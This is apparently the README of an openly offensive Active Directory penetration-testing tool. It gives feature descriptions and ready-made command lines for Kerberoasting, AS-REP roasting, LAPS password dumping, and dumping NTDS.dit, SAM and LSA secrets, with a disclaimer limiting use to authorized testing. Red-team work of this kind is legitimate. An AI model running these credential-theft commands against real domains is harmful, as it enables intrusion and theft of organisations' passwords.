
# Advanced Active Directory Reconnaissance and Attack Script

This script provides a comprehensive suite of tools for Active Directory (AD) reconnaissance and exploitation. It integrates LDAP enumeration, SMB and NetBIOS scanning, Kerberos attacks, credential dumping, LAPS password extraction, and WebDAV exploitability checks.

## Features

- **LDAP Enumeration**: Discover users, groups, computers, domain controllers, and other AD objects.
- **Password Parsing**: Checks user and group descriptions for potential passwords.
- **LAPS Password Dumping**: Extracts Local Administrator Password Solution (LAPS) passwords from AD if permissions allow.
- **NetBIOS and SMB Enumeration**: Enumerate SMB shares, active sessions, connected users, and access to common shares.
- **Kerberos Attacks**:
  - **Kerberoasting**: Extract service tickets for offline cracking.
  - **AS-REP Roasting**: Target accounts that do not require pre-authentication.
- **Credential Dumping**: Extract credentials from NTDS.dit, SAM database, and LSA secrets using Impacket’s `secretsdump.py`.
- **WebDAV Exploitability Check**: Checks if WebDAV is enabled and potentially exploitable on the target server.

## Prerequisites

- Python 3.x
- Install required Python libraries:
  ```bash
  pip install ldap3 impacket requests
  ```
- Impacket tools must be accessible in your Python environment (e.g., `GetUserSPNs.py`, `GetNPUsers.py`, `secretsdump.py`).

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/SQSamir/ad-recon.git
   cd ad-recon
   ```
2. Install the dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## Usage

### Basic LDAP and SMB Enumeration

Run the script with minimal parameters to perform basic AD enumeration using LDAP and SMB (anonymous bind):

```bash
python ad-recon.py --server <LDAP_SERVER> --domain <DOMAIN>
```

### Authenticated LDAP and SMB Enumeration

To use authenticated binds, provide username, password, and domain:

```bash
python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN>
```

### Perform Kerberoasting

Run Kerberoasting to extract service tickets for offline cracking:

```bash
python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --kerberoast
```

### Perform AS-REP Roasting

Use AS-REP Roasting to target accounts that do not require pre-authentication:

```bash
python ad-recon.py --server <LDAP_SERVER> --asrep <USER_FILE>
```

### Dump LAPS Passwords

Dump LAPS passwords from AD if your account has sufficient permissions:

```bash
python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --laps
```

### Check WebDAV Exploitability

Check if WebDAV is enabled and potentially exploitable:

```bash
python ad-recon.py --server <LDAP_SERVER> --webdav
```

### Dump Secrets

Dump NTDS.dit, SAM database, and LSA secrets using Impacket’s `secretsdump.py`:

```bash
python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --dump
```

## Options

- `--server` (required): LDAP/DC server address.
- `--username`: Username for LDAP/SMB bind (optional for anonymous).
- `--password`: Password for LDAP/SMB bind (optional for anonymous).
- `--domain`: Domain for LDAP/SMB bind (required if username is provided).
- `--kerberoast`: Perform Kerberoasting.
- `--asrep`: Perform AS-REP Roasting with specified user file.
- `--dump`: Dump secrets using `secretsdump`.
- `--laps`: Dump LAPS passwords from AD.
- `--webdav`: Check if WebDAV is enabled and exploitable.

## Example Commands

**Basic Recon (Anonymous Bind):**

```bash
python ad-recon.py --server 192.168.1.100 --domain example.com
```

**Authenticated Recon:**

```bash
python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local
```

**Run Kerberoasting:**

```bash
python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --kerberoast
```

**Run AS-REP Roasting:**

```bash
python ad-recon.py --server 192.168.1.100 --asrep users.txt
```

**Dump LAPS Passwords:**

```bash
python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --laps
```

**Check WebDAV Exploitability:**

```bash
python ad-recon.py --server 192.168.1.100 --webdav
```

**Dump Secrets:**

```bash
python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --dump
```

## Disclaimer

This script is intended for authorized penetration testing and red teaming purposes only. Unauthorized use of this script against systems without proper authorization is illegal and unethical.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contributing

Contributions are welcome! Please submit a pull request or open an issue to discuss improvements, features, or bugs.

## Acknowledgments

This script is inspired by techniques and methods from Juggernaut Sec's [Active Directory Hacking](https://juggernaut-sec.com/category/active-directory-hacking/) series.

---
